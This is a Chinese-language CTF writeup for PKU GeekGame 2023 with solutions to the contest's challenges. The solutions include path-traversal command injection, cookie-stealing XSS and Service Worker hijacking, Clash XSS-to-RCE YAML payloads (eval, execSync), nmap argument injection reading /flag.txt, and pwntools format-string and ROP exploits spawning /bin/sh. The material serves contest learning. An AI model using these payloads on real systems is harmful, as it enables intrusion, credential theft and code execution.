# PKU GeekGame 2023 Writeup

ID: MonKey \#GG

## 1. 一眼盯帧

打开附件看到是一个 GIF，通过 ffmpeg 转 mp4 之后用 VLC 慢速播放即可

```bash
ffmpeg -i ./prob23-signin.gif prob23-signin.mp4
```

## 2. 小北问答!!!!!

1. 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？
    * `sbatch`
    * 即答：只要是基于 SLURM 的系统都是 sbatch
    * 也可以参考：[北京大学高性能计算平台使用文档](https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html)
2. 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？
    * `5.15.78`
    * 网上搜索了一圈找到了小米开源内核的 [Github Repo](https://github.com/MiCode/Xiaomi_Kernel_OpenSource)，
      下拉到最后找到 Redmi K60 Ultra 对应的分支，然后打开根目录 Makefile 可以看到 `VERSION = 5 PATCHLEVEL = 15 SUBLEVEL = 78`
3. 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？
    * `Watch6,16`
    * 直接谷歌，找到这么一个 [Gist](https://gist.github.com/adamawolf/3048717)
4. 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）
    * `4445`
    * 平台任意网页拉到最底下，点击“开放源代码”，找到后端的 [Repo](https://github.com/PKU-GeekGame/gs-backend)，找到 `src/store/user_profile_store.py` 阅读可知 `DISALLOWED_CHARS` 是不允许的字符集合，在 Python 3.8 下运行这部分代码可得到结果
5. 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）
    * `游戏视频,游戏攻略·解说,Mugen,Flash游戏`
    * 使用 [Wayback Machine](https://web.archive.org/web/20110801000000*/http://bilibili.us/video/game.html)
6. 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？
    * `philharmonie.lu`
    * 通过搜索旗子上的赞助商可知这个活动是 IASP Luxembourg，尝试了 technoport.lu、eccl.lu 发现都不对，最后结合谷歌街景发现是马路对面的卢森堡音乐厅

## 3. Z 公司的服务器

### 服务器

NC 连接上服务器之后发现一串模数，经过搜索之后发现是 zmodem 协议。
但由于平台限制我们需要先输入个人 token 才能开始 zmodem 传输，这块可以通过写一个 Python 脚本过认证。

同时 rz 似乎对终端有一些限制，可以使用 `--tcp-client` 让 rz 从 Python 脚本创建的 TCP 服务器中读取数据。

运行以下脚本之后可以得到 flag.txt。

```python
import socket
import subprocess
import time
import threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('prob05.geekgame.pku.edu.cn', 10005))
s.recv(1024)
s.send(b'{token_here}\n')

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('localhost', 0))
server_socket.listen(1)

def run_rz():
    time.sleep(2)
    subprocess.run(['rz', '--tcp-client', 'localhost:{}'.format(server_socket.getsockname()[1])])

threading.Thread(target=run_rz).start()

rz_socket, _ = server_socket.accept()

def forward_to_server():
    while True:
        data = rz_socket.recv(1024)
        print('S %s' % data)
        if not data:
            break
        s.send(data)

threading.Thread(target=forward_to_server).start()

while True:
    data = s.recv(1024)
    print('R %s' % data)
    if not data:
        break
    rz_socket.send(data)

s.close()
rz_socket.close()
server_socket.close()
```

### 流量包

下载附件之后发现是一个 pcap 流量包，通过 Wireshark 跟踪 TCP 流可以看到服务器实际向客户端发送的 zmodem 数据。
导出服务器发送的数据为 `server.dat`，在终端运行 `rz`，然后把 `server.dat` 原始内容粘贴两遍即可得到一个 `flag.jpg`。

## 4. 猫咪状态监视器

分析 `server.py` 源代码，能看出来 server 允许的功能就是调用 `/usr/sbin/service --status-all` 和 `/usr/sbin/service {} status`。

第一个功能看起来没有什么卵用，在本地跑了一个环境之后发现里面只有 `hwclock.sh` 这么一个服务，又审计了 `hwclock.sh` 的源代码，看起来没有什么注入点。接着去看了看 `/usr/sbin/service`，他的大概逻辑如下：

1. 如果有 systemd，直接转发到 systemd
2. 反之，调用 `run_via_sysvinit`，直接运行位于 `$SERVICEDIR/$SERVICE` 对应的 SysV 脚本（！）

这里就存在一个注入点了，如果 `SERVICE` 是 `../../blahblah` 这样的对象就可以调用其他地方的程序

手玩一下就出结果了：

```bash
Command: STATUS
Service name: ../../bin/cat ./flag.txt
flag{____try_try_need____}
```

## 5. 基本功

参考：[ZIP已知明文攻击深入利用](https://www.freebuf.com/articles/network/255145.html)

### 简单的 Flag

打开 `challenge_1.zip` 之后发现里面一个 `chromedriver_linux64.zip` 一个 `flag1.txt`。

从网上下载了 `chromedriver_linux64.zip` 回来，发现里面只有一个子文件 `chromedriver_linux64`。

因此已知压缩包中的 `chromedriver_linux64.zip` 明文包含 `chromedriver_linux64`，偏移是 0x30，使用 bkcrack 破解密钥：

```bash
bkcrack -C challenge_1.zip -c chromedriver_linux64.zip -p plain.txt -o 30 -x 0 504B0304 >1.log&
```

接着用解出来的密钥解压 `flag1.txt` 即可：

```bash
bkcrack -C challenge_1.zip -c flag1.txt -k 0e839eaf 44a4de95 a6a00689 -d flag.txt
```

### 冷酷的 Flag

打开 `challenge_2.zip` 之后发现里面一个 `flag2.pcapng`。PCap 文件也是有明文特征的，因此可以继续破解：

```bash
bkcrack -C challenge_2.zip -c flag2.pcapng -p pcap_plain -o 6 > 2.log &
```

## 6. Dark Room

连接上之后发现是一个 TUI 游戏，手玩了一下，地图和原版代码几乎完全一样，除了出口南边有个 flagroom。

大概游戏流程：

1. 从右上角拿 key
2. 解开右下角的门进入走廊
3. 到走廊左上角拿到 golden key
4. 出走廊，到出生点左上角解开出口的门，出去

### Flag 1

手玩到出口发现需要 San 值大于 117，需要把游戏中两种加 san 的道具都用上分别是 trinkle 和 coffee。
接着走到出口大门处开始疯狂 help 攒 San 即可有概率过关。

```python
#!/usr/bin/env python3
from pwn import *

done = False

while not done:
    r = remote('prob16.geekgame.pku.edu.cn', 10016)
    r.recvuntil(b'Please input your token: ')
    r.send(b'{token_here}\n')

    r.recvuntil(b'[...]: ')
    r.send(b'newgame\n')

    r.recvuntil(b'[...]: ')
    r.send(b'!\n')
    r.recvuntil(b'(y/n) ')
    r.send(b'y\n')

    for l in open('script.txt', 'r'):
        r.recvuntil(b'[!]: ')
        r.send(l.encode('ascii'))

    r.recvuntil(b'[!]: ')
    while True:
        r.send(b'h\n')
        buf = r.recvuntil(b'[!]: ', timeout=1).decode('utf-8').split('\n')
        san = -1
        for l in buf:
            if 'Sanity' in l:
                san = int(l[l.find('(') + 1:l.find('%)')])
        print(san)
        if san == -1:
            print('Dead')
            break
        if san >= 118:
            r.send(b'n\n')
            print(r.recvall(timeout=10))
            done = True
            break

    r.close()
```

### Flag 2

走到 flagroom 发现是个猜 flag 的游戏，如果输入空字符会爆出代码：

```
Guess my public key (give me a number):
invalid literal for int() with base 10: ''
Traceback (most recent call last):
    File "dark_room/player.py", line 249, in <module>
    248:   while flag_number:
    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    250:      if flag_number & 1:
    251:          p = getStrongPrime(2048)
    252:          q = getStrongPrime(2048)
    253:      flag_number >> 1
ValueError: invalid literal for int() with base 10: ''
```

一开始没看懂这段代码有啥问题，后来发现是个时间侧信道，每次交互可以泄露出 flag 中最低一位的信息。

```python
#!/usr/bin/env python3
from pwn import *
import time
from Crypto.Util.number import bytes_to_long, long_to_bytes


r = remote('prob16.geekgame.pku.edu.cn', 10016)
r.recvuntil(b'Please input your token: ')
r.send(b'{token_here}\n')

r.recvuntil(b'[...]: ')
r.send(b'newgame\n')

r.recvuntil(b'[...]: ')
r.send(b'!\n')
r.recvuntil(b'(y/n) ')
r.send(b'y\n')

for l in open('script.txt', 'r'):
    r.recvuntil(b'[!]: ')
    r.send(l.encode('ascii'))

print(r.recv(4096, timeout=1))

r.send(b's\n')

print(r.recv(4096, timeout=1))
print(r.recv(4096, timeout=1))
print(r.recv(4096, timeout=1))

r.send(b'getflag\n')
print(r.recv(4096, timeout=1))

# timing attack
done = False
bit_pos = 0
content = 0
while not done:
    r.send(b'0\n')
    begin = time.time()

    try:
      buf = r.recvuntil(b'(give me a number): ', timeout=5)
    except EOFError:
       done = True
       break

    end = time.time()

    print(buf)
    if b'Wrong' not in buf and b'Guess' not in buf:
       done = True
       break

    if end - begin > 0.5:
       content |= 1 << bit_pos
    bit_pos += 1

    print(end - begin)

print(long_to_bytes(content))

r.close()
```

## 7. 麦恩·库拉夫特

### 探索的时光

使用原版 MC 加载地图之后用 `\gamemode spectator` 开启透视，跟着火把进入地下可以看到一个岩浆池，岩浆池上面有木板写着 flag。

## 8. Emoji Wordle

### Level 1

手玩了一会儿没发现啥规律，只觉得 emoji 很多但输入框中 placeholder 能命中很多 emoji，说明 emoji 集合并不大。

到最后一天的时候看了看 cookies 发现 `PLAY_SESSION` 是一个 JWT Token，因此可以复用过去签发的 Token 来突破次数限制。

接下来只需要写一个破解脚本来启发式搜索就行了，我设计的逻辑大概如下：
1. 从 placeholder 获取候选 emoji
2. 从候选 emoji 生成测试输入
3. 把结果为红色的 emoji 加入禁止集
4. 对于结果为黄色和绿色的 emoji，构造一个完全由这个 emoji 构成的输入，测试其他位置是否有这个 emoji，加入答案后把 emoji 加入禁止集

Python 脚本如下：

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote_plus as urlquote

emojis = set()
denylist = set()

resp = requests.get('https://prob14.geekgame.pku.edu.cn/level1')
cookies = resp.cookies
length = 64
holder = resp.content.find(b'placeholder=')
mask = [False] * 64
answer = ['  '] * 64
guess = list(resp.content[holder + 13: resp.content.find(b'"', holder + 13)].decode())
print('初始猜测：' + ''.join(answer))

def try_guess(seq):
    print('猜测: ' + ''.join(seq))
    resp = requests.get(
        f'https://prob14.geekgame.pku.edu.cn/level1?guess={urlquote("".join(seq))}', cookies=cookies)
    holder = resp.content.find(b'placeholder=')
    possible = list(resp.content[holder + 13: resp.content.find(b'"', holder + 13)].decode())
    for x in possible:
        if x not in denylist:
            emojis.add(x)
    push = resp.content.find(b'results.push(')
    result = list(resp.content[push + 14: resp.content.find(b'"', push + 14)].decode())
    print('结果：' + ''.join(result))
    return result


done = False
while not done:
    result = try_guess(guess)
    print(len(result))

    for i in range(len(result)):
        if result[i] == '🟥':
            emojis.discard(guess[i])
            denylist.add(guess[i])
        elif result[i] == '🟨' or result[i] == '🟩':
            guess2 = [guess[i]] * 64
            result2 = try_guess(guess2)
            for j in range(len(result2)):
                if result2[j] == '🟩':
                    mask[j] = True
                    answer[j] = guess[i]
            emojis.discard(guess[i])
            denylist.add(guess[i])
        else:
            assert False

    done = True
    for i in range(64):
        done = done and mask[i]

    guess = list(emojis)[:64]

print(''.join(answer))
```
### Level 2

解包 JWT Token 之后发现 emoji 就在 Token 当中。

### Level 3

解包 JWT Token 之后发现随机数种子是 Token 的一部分，因此只要复用同一 token 就可以破解次数限制 + 保持答案恒定。

复用 Level 1 脚本即可。

## 9. 第三新XSS

### 巡猎

查阅 MDN 文档知，Cookie Path 可以通过嵌入 iframe 来破解。

```html
<html>
<head>
</head>
<body>
  <iframe id="victim" src="/admin"></frame>
  <script>
    setTimeout(function() {
      var victim = document.findElementById("victim");
      document.title = victim.contentDocument.cookie;
    }, 500);
  </script>
</body>
</html>
```

### 记忆

查看 XSSBot 逻辑之后可以发现它访问了我们给定的页面后，访问了 `/admin`，后者我们无法直接控制其内容。

因此，可以借助注册 Service Worker 功能直接在浏览器中改写响应。

```html
<html>
  <head>
    <title>AAAAAA</title>
  </head>
  <body>
    <script>
      const registerServiceWorker = async () => {
        if ("serviceWorker" in navigator) {
          try {
            const registration = await navigator.serviceWorker.register("/sw_v6/", {
              scope: "/admin",
            });
            if (registration.installing) {
              console.log("正在安装 Service worker");
            } else if (registration.waiting) {
              console.log("已安装 Service worker installed");
            } else if (registration.active) {
              console.log("激活 Service worker");
            }
          } catch (error) {
            console.error(`注册失败：${error}`);
          }
        }
      };
      registerServiceWorker();
    </script>
  </body>
</html>
```

```javascript
// {"Service-Worker-Allowed": "/", "Content-Type": "text/javascript"}

self.addEventListener('install', function(event) {
  event.waitUntil(self.skipWaiting()); // 强制当前处在 waiting 状态的 Service Worker 进入 activate 状态
});

self.addEventListener('fetch', function(event) {
  if (event.request.url.endsWith('/')) {
    event.respondWith(new Response('<body><script>setInterval(function(){document.title = document.cookie;}, 100);</script></body>', {headers: {'Content-Type': 'text/html'}}));
  }
});

self.addEventListener('activate', function(event) {
  event.waitUntil(self.clients.claim());
});
```
## 10. 简单的打字稿

### Super Easy

第一问的 `flag1` 是一个字符串，因为不会写 TS 查阅了一下有关文献得知这玩意是一个 `literal type`。

然而我没有找到什么好办法来打印一个 type，但让 TS 触发类型检查错误可以打印出相关的 type 信息。

```typescript
type fff = 'glaf{aaaaaaa}'
var b: fff = '1'
/*
[+] Stderr:
Check file:///app/$deno$stdin.ts
error: TS2322 [ERROR]: Type '"1"' is not assignable to type '"glaf{aaaaaaa}"'.
var b: fff = '1'
    ^
    at file:///app/$deno$stdin.ts:5:5
*/
```

下一步就是网上找一些二手代码来拼装：

```typescript
type flag1 = 'flag{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}';

type StringToChars<T extends string> =
  string extends T ? string[] :
  T extends `${infer C0}${infer C1}${infer C2}${infer C3}${infer C4}${infer C5}${infer R}` ? [C0, C1, C2, C3, C4, C5, ...StringToChars<R>] :
  T extends `${infer C0}${infer C1}${infer C2}${infer C3}${infer R}` ? [C0, C1, C2, C3, ...StringToChars<R>] :
  T extends `${infer C0}${infer R}` ? [C0, ...StringToChars<R>] : [];

type TupleSplit<T, N extends number, O extends readonly any[] = readonly []> =
  O['length'] extends N ? [O, T] : T extends readonly [infer F, ...infer R] ?
  TupleSplit<readonly [...R], N, readonly [...O, F]> : [O, T]

type chars = StringToChars<flag1>;
var a0: TupleSplit<chars, 6> = ' ';
```

### Very Easy

这题给了一个很复杂的类型定义，很不幸，我不会 TS。但我们可以考虑拷打 GPT4。

具体的 Prompt 如下：

```
给定一个 TypeScript 类型比如 XXX，请你编写一个程序，通过类型推导得到 ABCD 类型，然而，由于 ABCD 是未知的，通用的计算流程，且全程不出现 ABCD。请你给出分步骤的推导过程。

你在第 XXX 这步推导有误，其中 YYY 类型实际推导为 ZZZ。
```

经过若干轮拷打，GPT4 给了我一个能跑的程序：

```typescript
type flag2 = object | { new (): { v: () => (a: (a: unknown, b: { 'flag{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}': never } & Record<string, string>) => never) => unknown } }

// 首先，我们需要从 flag2 中提取出可能的构造函数类型
type PossibleConstructor = Extract<flag2, { new(): any }>;

// 然后，我们需要从 PossibleConstructor 中提取出可能的实例类型
type PossibleInstance = PossibleConstructor extends new () => infer I ? I : never;

// 然后，我们需要从 PossibleInstance 中提取出可能的函数类型
type PossibleFunction = PossibleInstance extends { v: infer F } ? F : never;

// 接下来，我们需要从 PossibleFunction 的返回值中提取出可能的函数类型
type PossibleFunctionReturn = ReturnType<PossibleFunction>;

// 然后，我们需要从 PossibleFunctionReturn 中提取出可能的参数类型
type PossibleParameters = Parameters<PossibleFunctionReturn>;

// 然后，我们需要从 PossibleParameters 中提取出第二个参数类型
type PossibleSecondParameter = PossibleParameters[0] extends (a: unknown, b: infer B) => any ? B : never;

type a = PossibleSecondParameter extends (infer T) & Record<string, string> ? T: never;
type b = keyof a;
```

## 11. 逝界计划

这题二阶段发了 hint 我才恍然大悟。

一开始先去试了 Nmap，网上搜了一些有关 Nmap 命令注入的资料，比如 `-iL flag.txt` 可以修改目标输入为文件 `flag.txt`。分析 HomeAssistant 代码得知调用 Nmap 使用的是 `Popen`，所以不太可能实现 `nmap blah blah; cat flag.txt` 这种命令注入。

但还是没什么思路，于是就去挨个审计每个集成的代码，然后没啥进展。

最后发现 HomeAssistant 可以查看系统日志，对应系统中文件 `/config/home-assistant.log`，因此我们可以构造一个 nmap 命令使其从 `flag.txt` 读入目标，并将日志打印到 `/config/home-assistant.log`。

大概的命令如下：

```bash
nmap -iL /flag.txt --log-errors -oN /config/home-assistant.log --exclude 172.19.0.2 --reason -v 127.0.0.1/32
```
接着通过 配置 —— 日志 —— 加载完整日志可以看到 nmap 报错：

```
# Nmap 7.93 scan initiated Thu Oct 19 03:54:50 2023 as: nmap -oX - -iL /flag.txt --log-errors -oN /config/home-assistant.log --exclude 172.19.0.2 --reason -v 127.0.0.1/32
Failed to resolve "flag{__try_try_need__}".
Read data files from: /usr/bin/../share/nmap
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Thu Oct 19 03:54:55 2023 -- 0 IP addresses (0 hosts up) scanned in 5.05 seconds
```

## 12. 非法所得

看到 Clash 就去搜了一下，果然是 XSS RCE 复现

### Flag 1

没什么悬念，构造一个 sub.yaml 即可。平台只接受 `pku.edu.cn` 域下的文件，我们可以复用 XSS 题的上传接口。

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=alert(eval(`require("fs").readFileSync("/app/profiles/flag.yml")`));>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=alert(eval(`require("fs").readFileSync("/app/profiles/flag.yml")`));>
    type: select
    proxies:
    - a<img/src="1"/onerror=alert(eval(`require("fs").readFileSync("/app/profiles/flag.yml")`));>
```

### Flag 2

这个略复杂，根据 `index.mjs` 源代码可以知道，后台需要访问 `ys.pku.edu.cn`，然而这个域名并不存在，因此我们需要构造一个代理服务器，让 Clash 去连接并访问我们指定的 HTML 文件，从而输出 flag。

构造订阅如下：

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: PROXY
    type: http
    server: _____________server_here_____________
    port: "8084"
    skip-cert-verify: true
rules:
  - DOMAIN-SUFFIX,pku.edu.cn,PROXY
```

```bash
#!/bin/bash
#### socat TCP-LISTEN:8084,fork,reuseaddr "server.sh"
echo -e 'HTTP/1.1 200 Connection Established\r\n\r\n'
sleep 1

echo -e 'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n'
filesize=$(stat -c%s "yuanshen.html")
printf "%x\r\n" $filesize
cat yuanshen.html
echo -e '\r\n0\r\n\r\n'
```

```html
<html>
  <head>
    <title>Yuanshen!!!!!!!!!!!!!!</title>
  </head>
  <body>
    <input id="primogem_code" type="password" />
    <span id="hack"></span>
    <script>
      var input = document.getElementById("primogem_code");
      var hack = document.getElementById("hack");
      setInterval(function() {
        hack.innerText = input.value;
      }, 100);
    </script>
  </body>
</html>
```

### Flag 3

同 Flag1：

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=alert(eval(`require("child_process").execSync("/app/readflag")`));>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=alert(eval(`require("child_process").execSync("/app/readflag")`));>
    type: select
    proxies:
    - a<img/src="1"/onerror=alert(eval(`require("child_process").execSync("/app/readflag")`));>
```

## 13. 汉化绿色版免费下载

### 普通下载

打开之后发现是个游戏，使用 krkr 解包工具 `xp3_upk` 解开数据文件之后可以看到游戏脚本。

其中 `data/scenario/done.ks` 中有 flag

### 高速下载

使用 `KirikiriDescrambler` 对存档进行解包之后，在 `datasc.ksd` 存储了当前局面的变量信息，`datasu.ksd` 中存储了一些其他信息。

注意到 `datasu.ksd` 中有很多 `trail_{labelname}` 条目，联系 krkr2 的[引擎源代码](https://github.com/krkrz/krkr2/blob/master/kirikiri2/trunk/kag3/template/system/MainWindow.tjs#L2230-L2261)可以知道这些条目表明了对应的 label 被调用了多少次。

阅读 `round1.ks` 和 `round2.ks` 之后可以得知哈希值是由一个 1337Hash 算出来的，因此可以在 C++ 中复现该逻辑进行爆破。

```cpp
#include <iostream>
#include <string>
#include <vector>

using namespace std;

int y[] = {11, 22, 33, 44, 55};
char ch[] = {'A', 'E', 'I', 'O', 'U'};
int cnt[] = {6, 3, 1, 6, 0};
string ans = "";

void dfs(int dep, long long x) {
    if (dep == 16) {
        for (int i = 0; i < 5; i++)
            if (cnt[i] != 0) cout << "!" << endl;
        x = (x * 13337 + 66) % 19260817;
        if (x == 7748521) {
            cout << ans << endl;
        }
        return;
    }
    for (int i = 0; i < 5; ++i) {
        if (cnt[i] > 0) {
            cnt[i]--;
            ans.push_back(ch[i]);
            dfs(dep + 1, (x * 13337 + y[i]) % 19260817);
            ans.pop_back();
            cnt[i]++;
        }
    }
}

int main() {
    dfs(0, 1337);
    return 0;
}
```

## 14. 初学 C 语言

### Flag 1

程序拖到 Ghidra 里看了一眼，看起来是个栈溢出题。

接着 `checksec ./pwn`：

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

嗯。。保护全开，可是没有什么用

输入 `"%p" * 31` 到程序中，可以发现爆出来一堆栈上的数据，找一下 `67616c66`（flag）发现确实有，打印交差。

```python
#!/usr/bin/env python
from pwn import *

conn = remote('prob09.geekgame.pku.edu.cn', 10009)

conn.recvuntil(b'Please input your token: ')

conn.sendline(b'{token_here}\n')

conn.recv()
conn.sendline(b'%p' * 31)
resp = conn.recv()

resp = [t for k in resp.split(b'0x') for t in k.split(b'(')]
resp = resp[26:30]
resp.reverse()
resp = b''.join(resp).decode('utf-8')
if len(resp) % 2 != 0:
  resp = '0' + resp
resp = [resp[i:i+2] for i in range(0, len(resp), 2)]
resp.reverse()
resp = [chr(int(c, base=16)) for c in resp]

print(''.join(resp))

conn.close()
```

### Flag 2

学习了一下格式化字符串溢出相关的文献，发现了 `%35$s` 这样的用法，表示把第 35 个参数作为字符串指针打印，是一个 glibc 扩展功能。
同时，还有 `%67$hn`，可以把第 67 个参数当作指针，并把当前已经打印的字节数作为两字节数据写入指针。

利用这种 fmtstring，配合栈布局，可以恰好构造出来 `%35$sPPP{p64(pointer_here)}` 来打印任意地址。
类似的还可以构造一个写入任意内存的 fmtstring。

利用这些操作来复写 retaddr 跳转到 libc 中的 gadgets 即可。

```python
#!/usr/bin/env python
from pwn import *

conn = remote('prob09.geekgame.pku.edu.cn', 10009)
conn.recvuntil(b'Please input your token: ')
conn.sendline(b'{token_here}\n')

conn.recv()
conn.sendline(b'%p' * 35)
resp = conn.recv()

# Flag 1
raw_resp = [t for k in resp.split(b'0x') for t in k.split(b'(')]
print(raw_resp)
resp = raw_resp[26:30]
resp.reverse()
resp = b''.join(resp).decode('utf-8')
if len(resp) % 2 != 0:
  resp = '0' + resp
resp = [resp[i:i+2] for i in range(0, len(resp), 2)]
resp.reverse()
resp = [chr(int(c, base=16)) for c in resp]
print(''.join(resp))

# Leak canary
public_str_addr = int(raw_resp[1].decode(), 16)
print("%x" % public_str_addr)

print("%x" % (public_str_addr + 64 + 64 + 1024))
print(p64(public_str_addr + 64 + 64 + 1024))
print(p64(public_str_addr + 64 + 64 + 1024)[:-2])
conn.send(b'%35$sPPP' + p64(public_str_addr + 64 + 64 + 1024 + 8 + 1) + b'\n')
buf = conn.recv()
print(buf)
print(buf[:7])
canary = u64(b'\x00' + buf[:7])
rbp = u64(buf[7:buf.find(b'P')] + b'\x00\x00')
print('Canary = 0x%x' % canary)
print('RBP = 0x%x' % rbp)

retaddr_addr = public_str_addr + 64 + 64 + 1024 + 24
conn.send(b'%35$sPPP' + p64(retaddr_addr) + b'\n')
buf = conn.recv()
retaddr = u64(buf[:buf.find(b'P')] + b'\x00\x00')
print('RetAddr = 0x%x' % retaddr)

def poke_byte(addr, b):
  print('Poke 0x%x to 0x%x' % (b, addr))
  conn.send(b'A' * b +
            b'%67$hn' +
            b'P' * (264 - b - 6) +
            p64(addr) + b'\n')
  buf = conn.recv()

def poke_bytes(addr, b):
  for i, bb in enumerate(list(b)):
    poke_byte(addr + i, bb)

# Construct ROP Chain
elf = ELF('./pwn')
rop = ROP(elf)
print(rop.rax)
print(rop.rdi)
print(rop.rsi)
print(rop.rdx)

load_addr = retaddr - 0xa3fd
test_addr = load_addr + 0xa13d
print('Test target = 0x%x' % test_addr)
poke_bytes(retaddr_addr, (
  p64(load_addr + rop.rax.address) +
  p64(59) + # syscallnum = EXECVE
  p64(load_addr + rop.rdi.address) +
  p64(retaddr_addr + 8 * 10) + # param1 -> /bin/sh
  p64(load_addr + rop.rsi.address) +
  p64(0) + # param2 = 0
  p64(load_addr + rop.rdx.address) +
  p64(0) + # param3 = 0
  p64(load_addr + rop.syscall.address) +
  p64(0) +
  b"/bin/sh"
))

conn.send(b'%35$sPPP' + p64(retaddr_addr) + b'\n')
buf = conn.recv()
retaddr = u64(buf[:buf.find(b'P')] + b'\x00' * 2)
print('RetAddr = 0x%x' % retaddr)

conn.send(b'exit\n')
print(conn.recv(timeout=5))

conn.interactive()
```

## 15. Baby Stack

### Flag 1

checksec 发现只开了 NX，没有 Canary，程序也不是可重定位的。

拖到 Ghidra 里面发现 backdoor 函数，因此只需要控制程序跳到此函数即可。

```python
#!/usr/bin/env python
from pwn import *

r = remote('prob10.geekgame.pku.edu.cn', 10010)
r.send(b'{token_here}\n')
# r = process(['./challenge1'])
# input()

print(r.recv())
r.send(b'0\n')

print(r.recv())

r.send(b'A' * 120 + p64(0x4011be) + b'\n')
print(r.interactive())
```

### Flag 2

首先输入一串 `%p`，结合 gdb 的 `info proc mappings`，可以看到爆出来了 libc 代码段上的某个地址，从而泄露 libc 基址。

第二次输入时，可以实现栈溢出覆盖 retaddr，构造 ret2libc 即可。

```python
#!/usr/bin/env python
from pwn import *

r = remote('prob11.geekgame.pku.edu.cn', 10011)
r.recv()
r.send(b'{token_here}\n')
# r = process(['./challenge2'])
# input()

print(r.recv())
r.send(b'%p-' * 10 + b'\n')
buf = r.recv().split(b'-')
print(buf[2].decode()[2:])
libc_magic = int(buf[2].decode()[2:], 16) - 0xeca37 - 0x28000
print('Libc load address = 0x%x' % libc_magic)

libc = ELF('./libc.so.6')
rop = ROP(libc)
print(rop.rax)
print(rop.rdi)
print(rop.rsi)
print(rop.rdx)

r.send(
  (b'B' * (120) +
  p64(libc_magic + rop.rax.address) +
  p64(59) + # syscallnum = EXECVE
  p64(libc_magic + rop.rdi.address) +
  p64(libc_magic + next(libc.search(b'/bin/sh'))) + # param1 -> /bin/sh
  p64(libc_magic + rop.rsi.address) +
  p64(0) + # param2 = 0
  p64(libc_magic + rop.rdx.address) +
  p64(0) + # param3 = 0
  p64(0) +
  p64(libc_magic + rop.syscall.address)
  + b'\n'))
print(r.recv())

r.send(b'AAA\n')
print(r.interactive())
```

## 16. 绝妙的多项式

拖进 Ghidra 直接看到 998244353，基本上确定是 NTT 题。

在看了看 mint 的定义，是一个模 998244353 意义下的整数类型，推测 m 是 modulo 的意思。

### Baby

分析程序功能，大概如下：

1. 读入一个长为 36 的字符串
2. 根据字符串中每个字符的 ascii 生成一个 `mint a[]`
3. 对 `a` 进行一些**线性运算**得到 `b`
4. 判断 `b` 是否等于数据段中某个数组 `INT_ARRAY`

因此我们可以把 `INT_ARRAY` dump 出来，然后用模意义下的高斯消元反解 `a`。

```python
#!/usr/bin/env python3
import struct
import numpy as np

dump = b'\xf6\x0c\x00\x00{omitted...}'
INT_ARRAY = [struct.unpack('<I', dump[i:i+4])[0] for i in range(0, len(dump), 4)]
MOD = 998244353

MOD = 998244353
N = 36

def quick_pow(x, n):
    res = 1
    while n:
        if n & 1:
            res = res * x % MOD
        x = x * x % MOD
        n >>= 1
    return res

def gauss(mat, ans):
    n = len(mat)
    for i in range(n):
        if mat[i][i] == 0:
            for j in range(i + 1, n):
                if mat[j][i] != 0:
                    mat[i], mat[j] = mat[j], mat[i]
                    ans[i], ans[j] = ans[j], ans[i]
                    break
        inv = quick_pow(mat[i][i], MOD - 2)
        for j in range(i, n):
            mat[i][j] = mat[i][j] * inv % MOD
        ans[i] = ans[i] * inv % MOD
        for j in range(i + 1, n):
            mul = mat[j][i]
            for k in range(i, n):
                mat[j][k] = (mat[j][k] - mat[i][k] * mul) % MOD
            ans[j] = (ans[j] - ans[i] * mul) % MOD
    for i in range(n - 1, -1, -1):
        for j in range(i + 1, n):
            ans[i] = (ans[i] - mat[i][j] * ans[j]) % MOD
    return ans

mat = [[0]*N for _ in range(N)]
ans = INT_ARRAY

for i in range(N):
    for j in range(N):
        mat[i][j] = quick_pow(i+1, j)

flag = gauss(mat, ans)
print(''.join(chr(x) for x in flag))
```

### Easy

分析程序功能，大概如下：

1. 读入一个长为 45 的字符串
2. 根据字符串中每个字符的 ascii 生成一个 `mint a[]`
3. 对 `a` 进行函数调用 `X` 得到 `b`
4. 判断 `b` 是否等于数据段中某个数组 `INT_ARRAY`

这个时候我们还不知道 `X` 是什么，紧接着阅读第三问的代码：

1. 读入一个长为 40 的字符串
2. 根据字符串中每个字符的 ascii 生成一个 `mint a[]`
3. 循环填充 `welcome_to_the_world_of_polynomial` 生成一个 `mint b[]`
4. 对 `a` 进行函数调用 `X` 得到 `c`
5. 对 `b` 进行函数调用 `X` 得到 `d`
6. 对 `c` 和 `d` 进行**点乘**得到 `e`
